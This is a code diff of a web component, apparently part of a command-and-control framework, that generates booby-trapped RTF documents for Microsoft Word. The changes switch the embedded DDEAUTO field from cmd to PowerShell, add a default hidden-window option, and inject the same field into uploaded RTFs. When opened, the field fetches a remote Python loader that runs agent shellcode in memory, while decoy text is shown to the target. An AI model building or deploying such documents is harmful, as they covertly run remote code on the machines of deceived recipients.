@@ -17,74 +17,86 @@
         </div>
 
         <div class="loader-section">
-            <h4 class="loader-section-title">Supported Platforms</h4>
-            <div class="loader-platforms">
-                <span class="loader-platform"><C2Icon Name="monitor" Size="Size.Xs" /> Windows</span>
-            </div>
-        </div>
-
-        <div class="loader-section">
             <h4 class="loader-section-title">1 — Python Loader URL</h4>
             <p class="loader-text rtf-field-hint">
-                URL of the Python loader script. The DDE field will run <code>curl URL | python3</code> when the document is opened.
+                URL of the Python loader script. The DDE field will run <code>powershell -enc &lt;base64&gt;</code> when the document is opened.
             </p>
-            <C2InputActions Value="@_loaderUrl" ValueChanged="v => { _loaderUrl = v; Rebuild(); }" Monospace BindOnInput
+            <C2InputActions Value="@_loaderUrl" ValueChanged="OnLoaderUrlChanged" Monospace BindOnInput
                             Placeholder="https://raw.githubusercontent.com/.../loader.py" />
+            <label class="rtf-toggle">
+                <input type="checkbox" checked="@_hidden" @onchange="OnHiddenChanged" />
+                <span class="rtf-toggle-label">Hidden window</span>
+                <span class="loader-text rtf-field-hint">@(_hidden ? "PowerShell runs hidden — no window appears" : "PowerShell window is visible")</span>
+            </label>
         </div>
 
         <div class="loader-section">
-            <h4 class="loader-section-title">2 — Document Content</h4>
-            <p class="loader-text rtf-field-hint">
-                Decoy text shown after the DDE field executes. This is what the target sees in the document.
-            </p>
-            <C2Input Value="@_docTitle" ValueChanged="v => { _docTitle = v; Rebuild(); }" BindOnInput
-                     Placeholder="Document title" CssClass="rtf-input-spacing" />
-            <textarea class="rtf-textarea" @bind="_docBody" @bind:event="oninput" @bind:after="Rebuild"
-                      placeholder="Document body text..." rows="4"></textarea>
-        </div>
-
-        <div class="loader-section">
-            <h4 class="loader-section-title">3 — Generated RTF</h4>
-            <div class="rtf-preview-wrap">
-                <pre class="rtf-preview">@_rtfContent</pre>
-            </div>
-            <div class="rtf-actions">
-                <button class="loader-link-btn" @onclick="DownloadRtf">
-                    <C2Icon Name="download" Size="Size.Xs" /> Download RTF
+            <h4 class="loader-section-title">2 — Output</h4>
+            <div class="rtf-mode-tabs">
+                <button class="rtf-mode-tab @(_mode == Mode.Generate ? "rtf-mode-tab--active" : "")"
+                        @onclick="() => SetMode(Mode.Generate)">
+                    <C2Icon Name="file-text" Size="Size.Xs" /> Generate
                 </button>
-                <button class="loader-copy-btn rtf-copy-wide" @onclick="() => Copy(_rtfContent)" title="Copy RTF source">
-                    <C2Icon Name="copy" Size="Size.Xs" /> Copy
+                <button class="rtf-mode-tab @(_mode == Mode.Upload ? "rtf-mode-tab--active" : "")"
+                        @onclick="() => SetMode(Mode.Upload)">
+                    <C2Icon Name="upload" Size="Size.Xs" /> Upload Custom
                 </button>
             </div>
-        </div>
 
-        <div class="loader-section">
-            <h4 class="loader-section-title">4 — Custom RTF</h4>
-            <p class="loader-text rtf-field-hint">
-                Upload your own RTF document. The DDE field will be injected after the header, preserving your formatting and content.
-            </p>
-            <div class="rtf-actions">
-                <label class="loader-link-btn" style="cursor:pointer">
-                    <C2Icon Name="upload" Size="Size.Xs" /> Upload RTF
-                    <InputFile OnChange="OnCustomRtfUpload" accept=".rtf" style="display:none" />
-                </label>
-                @if (!string.IsNullOrEmpty(_customFileName))
-                {
-                    <span class="loader-text" style="margin-left:0.5rem;">@_customFileName</span>
-                }
-            </div>
-            @if (!string.IsNullOrEmpty(_customRtfContent))
+            @if (_mode == Mode.Generate)
             {
-                <div class="rtf-preview-wrap" style="margin-top:0.5rem;">
-                    <pre class="rtf-preview">@_customRtfContent</pre>
+                <div class="rtf-mode-body">
+                    <p class="loader-text rtf-field-hint">
+                        Decoy text shown after the DDE field executes. This is what the target sees in the document.
+                    </p>
+                    <C2Input Value="@_docTitle" ValueChanged="v => { _docTitle = v; Rebuild(); }" BindOnInput
+                             Placeholder="Document title" CssClass="rtf-input-spacing" />
+                    <textarea class="rtf-textarea" @bind="_docBody" @bind:event="oninput" @bind:after="Rebuild"
+                              placeholder="Document body text..." rows="4"></textarea>
+
+                    <div class="rtf-preview-wrap">
+                        <pre class="rtf-preview">@_rtfContent</pre>
+                    </div>
+                    <div class="rtf-actions">
+                        <button class="loader-link-btn" @onclick="DownloadRtf">
+                            <C2Icon Name="download" Size="Size.Xs" /> Download RTF
+                        </button>
+                        <button class="loader-copy-btn rtf-copy-wide" @onclick="() => Copy(_rtfContent)" title="Copy RTF source">
+                            <C2Icon Name="copy" Size="Size.Xs" /> Copy
+                        </button>
+                    </div>
                 </div>
-                <div class="rtf-actions">
-                    <button class="loader-link-btn" @onclick="DownloadCustomRtf">
-                        <C2Icon Name="download" Size="Size.Xs" /> Download Injected RTF
-                    </button>
-                    <button class="loader-copy-btn rtf-copy-wide" @onclick="() => Copy(_customRtfContent)" title="Copy RTF source">
-                        <C2Icon Name="copy" Size="Size.Xs" /> Copy
-                    </button>
+            }
+            else
+            {
+                <div class="rtf-mode-body">
+                    <p class="loader-text rtf-field-hint">
+                        Upload your own RTF document. The DDE field will be injected after the header, preserving your formatting and content.
+                    </p>
+                    <div class="rtf-actions">
+                        <label class="loader-link-btn" style="cursor:pointer">
+                            <C2Icon Name="upload" Size="Size.Xs" /> Upload RTF
+                            <InputFile OnChange="OnCustomRtfUpload" accept=".rtf" style="display:none" />
+                        </label>
+                        @if (!string.IsNullOrEmpty(_customFileName))
+                        {
+                            <span class="loader-text">@_customFileName</span>
+                        }
+                    </div>
+                    @if (!string.IsNullOrEmpty(_customRtfContent))
+                    {
+                        <div class="rtf-preview-wrap">
+                            <pre class="rtf-preview">@_customRtfContent</pre>
+                        </div>
+                        <div class="rtf-actions">
+                            <button class="loader-link-btn" @onclick="DownloadCustomRtf">
+                                <C2Icon Name="download" Size="Size.Xs" /> Download Injected RTF
+                            </button>
+                            <button class="loader-copy-btn rtf-copy-wide" @onclick="() => Copy(_customRtfContent)" title="Copy RTF source">
+                                <C2Icon Name="copy" Size="Size.Xs" /> Copy
+                            </button>
+                        </div>
+                    }
                 </div>
             }
         </div>
@@ -94,7 +106,7 @@
             <p class="loader-text">
                 1. Target opens the RTF in Microsoft Word<br/>
                 2. Word prompts "This document contains links … Do you want to update?"<br/>
-                3. On accept, the DDE field executes: <code>cmd /c curl [loader URL] | python3</code><br/>
+                3. On accept, the DDE field executes: <code>powershell -NoP -enc [base64 of "curl URL | python3"]</code><br/>
                 4. The Python loader downloads the agent shellcode and runs it in memory<br/>
                 5. The document displays the decoy content
             </p>
@@ -105,6 +117,10 @@
 @code {
     private const string DefaultLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/loader.py";
 
+    private enum Mode { Generate, Upload }
+
+    private Mode _mode = Mode.Generate;
+    private bool _hidden = true;
     private string _loaderUrl = DefaultLoaderUrl;
     private string _docTitle = "";
     private string _docBody = "";
@@ -114,17 +130,43 @@
 
     protected override void OnInitialized() => Rebuild();
 
-    private void Rebuild()
+    private void SetMode(Mode mode)
     {
-        _rtfContent = GenerateRtf(_loaderUrl, _docTitle, _docBody);
+        _mode = mode;
     }
 
-    private static string GenerateRtf(string loaderUrl, string title, string body)
+    private void OnLoaderUrlChanged(string v)
     {
-        // Build the DDE command: cmd silently runs curl <url> | python3
-        // DDEAUTO runs automatically; the first arg is the program, second is the arguments
-        var cmd = $"curl {loaderUrl} | python3";
-        var ddeField = @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ""/c " + RtfEscape(cmd) + @"""}}{" + @"\fldrslt }}";
+        _loaderUrl = v;
+        Rebuild();
+        if (!string.IsNullOrEmpty(_customRtfOriginal))
+            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden);
+    }
+
+    private void OnHiddenChanged(ChangeEventArgs e)
+    {
+        _hidden = e.Value is true;
+        Rebuild();
+        if (!string.IsNullOrEmpty(_customRtfOriginal))
+            _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden);
+    }
+
+    private void Rebuild()
+    {
+        _rtfContent = GenerateRtf(_loaderUrl, _docTitle, _docBody, _hidden);
+    }
+
+    private static string BuildDdeField(string loaderUrl, bool hidden)
+    {
+        // Always use PowerShell (v2.0+).
+        var windowStyle = hidden ? "-W Hidden " : "";
+        var psArgs = $"{windowStyle}-NoP -C irm {loaderUrl} | python3";
+        return @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe """ + RtfEscape(psArgs) + @"""}}{" + @"\fldrslt }}";
+    }
+
+    private static string GenerateRtf(string loaderUrl, string title, string body, bool hidden)
+    {
+        var ddeField = BuildDdeField(loaderUrl, hidden);
 
         var titleRtf = string.IsNullOrWhiteSpace(title)
             ? ""
@@ -173,6 +215,10 @@
         ");
     }
 
+    // --- Upload custom RTF ---
+
+    private string _customRtfOriginal = "";
+
     private async Task OnCustomRtfUpload(InputFileChangeEventArgs e)
     {
         var file = e.File;
@@ -181,22 +227,20 @@
         _customFileName = file.Name;
         using var stream = file.OpenReadStream(maxAllowedSize: 10 * 1024 * 1024);
         using var reader = new System.IO.StreamReader(stream);
-        var content = await reader.ReadToEndAsync();
+        _customRtfOriginal = await reader.ReadToEndAsync();
 
-        _customRtfContent = InjectDde(content, _loaderUrl);
+        _customRtfContent = InjectDde(_customRtfOriginal, _loaderUrl, _hidden);
         StateHasChanged();
     }
 
-    private static string InjectDde(string rtfContent, string loaderUrl)
+    private static string InjectDde(string rtfContent, string loaderUrl, bool visible)
     {
-        var cmd = $"curl {loaderUrl} | python3";
-        var ddeField = @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ""/c " + RtfEscape(cmd) + @"""}}{" + @"\fldrslt }}" + "\n";
+        var ddeField = BuildDdeField(loaderUrl, visible) + "\n";
 
         // Insert DDE field right after the first \pard (start of document body)
         var pardIdx = rtfContent.IndexOf("\\pard");
         if (pardIdx >= 0)
         {
-            // Find the space or next control word after \pard to insert after the paragraph start
             var insertIdx = rtfContent.IndexOf(' ', pardIdx);
             if (insertIdx < 0) insertIdx = pardIdx + 5;
             return rtfContent[..(insertIdx + 1)] + ddeField + rtfContent[(insertIdx + 1)..];
